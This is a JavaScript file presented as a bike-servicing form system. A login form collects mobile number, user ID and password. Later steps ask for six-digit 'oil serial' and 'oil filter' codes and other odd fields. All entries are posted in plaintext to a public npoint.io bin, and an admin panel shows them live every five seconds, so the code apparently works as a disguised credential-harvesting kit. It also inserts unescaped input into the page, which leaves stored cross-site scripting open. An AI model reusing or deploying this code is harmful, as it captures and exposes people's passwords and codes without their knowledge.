// script.js - Complete Bike Servicing System

// ====================
// 1. BACKEND API SETUP
// ====================
const API_URL = 'https://api.npoint.io/YOUR_BIN_ID'; // Replace with your npoint.io URL

// Current form data storage
let currentFormData = {};

// ====================
// 2. COMMON FUNCTIONS
// ====================

// Get current timestamp
function getCurrentTimestamp() {
    return new Date().toLocaleString('hi-IN', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

// Save data to backend
async function saveToBackend(data) {
    try {
        // Get existing data
        const response = await fetch(API_URL);
        let allData = await response.json();
        
        // If no data exists, initialize array
        if (!Array.isArray(allData)) {
            allData = [];
        }
        
        // Add new data with timestamp
        const newEntry = {
            ...data,
            id: Date.now(),
            timestamp: getCurrentTimestamp(),
            completed: false
        };
        
        allData.push(newEntry);
        
        // Save updated data
        await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(allData)
        });
        
        console.log('Data saved successfully:', newEntry);
        return true;
    } catch (error) {
        console.error('Error saving data:', error);
        alert('डाटा सेव करने में त्रुटि! कृपया बाद में प्रयास करें।');
        return false;
    }
}

// Get all data from backend
async function getAllData() {
    try {
        const response = await fetch(API_URL);
        const data = await response.json();
        return Array.isArray(data) ? data : [];
    } catch (error) {
        console.error('Error fetching data:', error);
        return [];
    }
}

// ====================
// 3. FORM HANDLERS
// ====================

// Initialize form based on current page
function initializeForm() {
    const path = window.location.pathname;
    const page = path.split('/').pop() || 'index.html';
    
    console.log('Current page:', page);
    
    switch(page) {
        case 'index.html':
        case '':
            setupLoginForm();
            break;
        case 'oil.html':
            setupOilForm();
            break;
        case 'oilbrand.html':
            setupOilBrandForm();
            break;
        case 'panchar.html':
            setupPancharForm();
            break;
        case 'oilfilter.html':
            setupOilFilterForm();
            break;
        case 'admin.html':
            setupAdminPanel();
            break;
        default:
            if (page.includes('index')) setupLoginForm();
            else if (page.includes('admin')) setupAdminPanel();
    }
}

// ====================
// 4. FORM SETUP FUNCTIONS
// ====================

// 1. Login Form
function setupLoginForm() {
    const form = document.getElementById('loginForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const formData = {
            mobile: document.getElementById('mobile').value.trim(),
            userid: document.getElementById('userid').value.trim(),
            password: document.getElementById('password').value.trim(),
            step: 'login',
            page: 'index'
        };
        
        // Basic validation
        if (!formData.mobile || !formData.userid || !formData.password) {
            alert('कृपया सभी फील्ड भरें!');
            return;
        }
        
        if (formData.mobile.length !== 10 || isNaN(formData.mobile)) {
            alert('कृपया सही मोबाइल नंबर डालें (10 अंक)!');
            return;
        }
        
        // Save to backend
        const saved = await saveToBackend(formData);
        if (saved) {
            window.location.href = 'oil.html';
        }
    });
    
    // Auto-focus on mobile input
    setTimeout(() => {
        const mobileInput = document.getElementById('mobile');
        if (mobileInput) mobileInput.focus();
    }, 100);
}

// 2. Oil Serial Form
function setupOilForm() {
    const form = document.getElementById('oilForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const oilSerial = document.getElementById('oilSerial').value.trim();
        
        if (!oilSerial || oilSerial.length !== 6 || isNaN(oilSerial)) {
            alert('कृपया 6 अंकों का सही Oil Serial नंबर डालें!');
            return;
        }
        
        const formData = {
            oilSerial: oilSerial,
            step: 'oil'
        };
        
        const saved = await saveToBackend(formData);
        if (saved) {
            window.location.href = 'oilbrand.html';
        }
    });
    
    // Auto-focus
    setTimeout(() => {
        const oilInput = document.getElementById('oilSerial');
        if (oilInput) oilInput.focus();
    }, 100);
}

// 3. Oil Brand Form
function setupOilBrandForm() {
    const form = document.getElementById('brandForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const brandName = document.getElementById('brandName').value.trim();
        const modelNo = document.getElementById('modelNo').value.trim();
        
        if (!brandName || !modelNo) {
            alert('कृपया Brand Name और Model No. दोनों भरें!');
            return;
        }
        
        const formData = {
            brandName: brandName,
            modelNo: modelNo,
            step: 'oilbrand'
        };
        
        const saved = await saveToBackend(formData);
        if (saved) {
            window.location.href = 'panchar.html';
        }
    });
    
    // Auto-focus
    setTimeout(() => {
        const brandInput = document.getElementById('brandName');
        if (brandInput) brandInput.focus();
    }, 100);
}

// 4. Panchar Form
function setupPancharForm() {
    const form = document.getElementById('pancharForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const pancharName = document.getElementById('pancharName').value.trim();
        const pancharNo = document.getElementById('pancharNo').value.trim();
        
        if (!pancharName || !pancharNo) {
            alert('कृपया Panchar Name और Panchar No. दोनों भरें!');
            return;
        }
        
        const formData = {
            pancharName: pancharName,
            pancharNo: pancharNo,
            step: 'panchar'
        };
        
        const saved = await saveToBackend(formData);
        if (saved) {
            window.location.href = 'oilfilter.html';
        }
    });
    
    // Auto-focus
    setTimeout(() => {
        const pancharInput = document.getElementById('pancharName');
        if (pancharInput) pancharInput.focus();
    }, 100);
}

// 5. Oil Filter Form
function setupOilFilterForm() {
    const form = document.getElementById('filterForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const oilFilterNo = document.getElementById('oilFilterNo').value.trim();
        
        if (!oilFilterNo || oilFilterNo.length !== 6 || isNaN(oilFilterNo)) {
            alert('कृपया 6 अंकों का सही Oil Filter नंबर डालें!');
            return;
        }
        
        const formData = {
            oilFilterNo: oilFilterNo,
            step: 'oilfilter',
            completed: true
        };
        
        const saved = await saveToBackend(formData);
        if (saved) {
            alert('✅ डाटा सफलतापूर्वक सेव हो गया! Admin पेज पर रीडायरेक्ट किया जा रहा है...');
            window.location.href = 'index.html';
        }
    });
    
    // Auto-focus
    setTimeout(() => {
        const filterInput = document.getElementById('oilFilterNo');
        if (filterInput) filterInput.focus();
    }, 100);
}

// ====================
// 5. ADMIN PANEL
// ====================

function setupAdminPanel() {
    // Add blinking effect
    document.body.classList.add('blink-refresh');
    
    // Load data immediately
    loadAdminData();
    
    // Auto refresh every 5 seconds
    setInterval(loadAdminData, 5000);
    
    // Add refresh button functionality
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', loadAdminData);
    }
    
    // Add clear data button functionality
    const clearBtn = document.getElementById('clearBtn');
    if (clearBtn) {
        clearBtn.addEventListener('click', clearAllData);
    }
}

async function loadAdminData() {
    try {
        const allData = await getAllData();
        const container = document.getElementById('dataContainer');
        
        if (!container) return;
        
        if (!allData || allData.length === 0) {
            container.innerHTML = `
                <div class="no-data">
                    <h3>📭 अभी तक कोई डाटा नहीं है</h3>
                    <p>जैसे ही कोई सबमिशन आएगा, यहाँ दिखने लगेगा</p>
                </div>
            `;
            return;
        }
        
        // Sort by latest first
        const sortedData = [...allData].sort((a, b) => b.id - a.id);
        
        container.innerHTML = sortedData.map((record, index) => {
            // Calculate total steps completed
            const steps = ['login', 'oil', 'oilbrand', 'panchar', 'oilfilter'];
            const completedSteps = steps.filter(step => record[step] || (step === 'login' && record.mobile)).length;
            const completionPercentage = Math.round((completedSteps / steps.length) * 100);
            
            return `
                <div class="record ${record.completed ? 'completed' : 'incomplete'}">
                    <div class="record-header">
                        <span class="record-no">#${index + 1}</span>
                        <span class="record-time">${record.timestamp || 'Time not recorded'}</span>
                        <span class="record-status">${record.completed ? '✅ पूरा हुआ' : '🔄 चल रहा है'}</span>
                    </div>
                    
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: ${completionPercentage}%">
                            ${completionPercentage}% पूरा
                        </div>
                    </div>
                    
                    <div class="record-details">
                        <div class="detail-row">
                            <span class="label">📱 मोबाइल:</span>
                            <span class="value">${record.mobile || 'N/A'}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">👤 यूज़र ID:</span>
                            <span class="value">${record.userid || 'N/A'}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">🛢️ Oil Serial:</span>
                            <span class="value">${record.oilSerial || 'N/A'}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">🏷️ ब्रांड:</span>
                            <span class="value">${record.brandName || 'N/A'} (${record.modelNo || 'N/A'})</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">🔧 पंचर स्टाफ:</span>
                            <span class="value">${record.pancharName || 'N/A'} (${record.pancharNo || 'N/A'})</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">🔩 Oil Filter:</span>
                            <span class="value">${record.oilFilterNo || 'N/A'}</span>
                        </div>
                    </div>
                    
                    <div class="record-actions">
                        <button class="btn-view" onclick="viewRecord(${record.id})">👁️ देखें</button>
                        <button class="btn-delete" onclick="deleteRecord(${record.id})">🗑️ हटाएं</button>
                    </div>
                </div>
            `;
        }).join('');
        
        // Update count
        const totalCount = document.getElementById('totalCount');
        const completedCount = document.getElementById('completedCount');
        if (totalCount) totalCount.textContent = allData.length;
        if (completedCount) completedCount.textContent = allData.filter(r => r.completed).length;
        
    } catch (error) {
        console.error('Error loading admin data:', error);
        const container = document.getElementById('dataContainer');
        if (container) {
            container.innerHTML = `
                <div class="error">
                    <h3>❌ डाटा लोड करने में त्रुटि</h3>
                    <p>कृपया इंटरनेट कनेक्शन चेक करें</p>
                </div>
            `;
        }
    }
}

// Delete a record
async function deleteRecord(id) {
    if (!confirm('क्या आप वाकई इस रिकॉर्ड को हटाना चाहते हैं?')) return;
    
    try {
        const allData = await getAllData();
        const filteredData = allData.filter(record => record.id !== id);
        
        await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(filteredData)
        });
        
        alert('रिकॉर्ड सफलतापूर्वक हटा दिया गया!');
        loadAdminData();
    } catch (error) {
        console.error('Error deleting record:', error);
        alert('रिकॉर्ड हटाने में त्रुटि!');
    }
}

// Clear all data
async function clearAllData() {
    if (!confirm('⚠️ क्या आप सारा डाटा हटाना चाहते हैं? यह एक्शन वापस नहीं आ सकता!')) return;
    
    try {
        await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify([])
        });
        
        alert('✅ सारा डाटा सफलतापूर्वक हटा दिया गया!');
        loadAdminData();
    } catch (error) {
        console.error('Error clearing data:', error);
        alert('डाटा हटाने में त्रुटि!');
    }
}

// View record details
function viewRecord(id) {
    alert(`Record ID: ${id}\nDetailed view feature can be added here.`);
}

// ====================
// 6. INITIALIZE WHEN PAGE LOADS
// ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('Bike Servicing System JS Loaded');
    initializeForm();
    
    // Add CSS for admin panel if on admin page
    if (window.location.pathname.includes('admin')) {
        const style = document.createElement('style');
        style.textContent = `
            .blink-refresh {
                animation: blink 5s infinite;
            }
            @keyframes blink {
                0%, 50%, 100% { opacity: 1; }
                25%, 75% { opacity: 0.95; }
            }
            .record {
                transition: all 0.3s;
            }
            .record:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
        `;
        document.head.appendChild(style);
    }
});

// ====================
// 7. EXPORT FOR CLOUDFLARE WORKERS (Optional)
// ====================
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        saveToBackend,
        getAllData,
        getCurrentTimestamp
    };
    }
